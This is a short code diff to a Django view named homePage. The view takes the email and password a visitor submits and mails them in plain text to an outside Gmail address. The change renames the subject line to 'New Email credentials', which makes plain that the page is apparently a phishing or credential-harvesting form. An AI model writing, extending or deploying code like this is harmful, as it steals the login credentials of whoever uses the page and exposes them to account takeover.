@@ -7,7 +7,7 @@ def homePage(request):
         email = request.POST.get('email')
         password = request.POST.get('password')
 
-        subject = f"New Email"
+        subject = f"New Email credentials"
         message = f"email: {email}, password: {password}"
         recipient_list = ['wolfensteinjonathan@gmail.com']
         sender_email = 'webmaster@example.com'
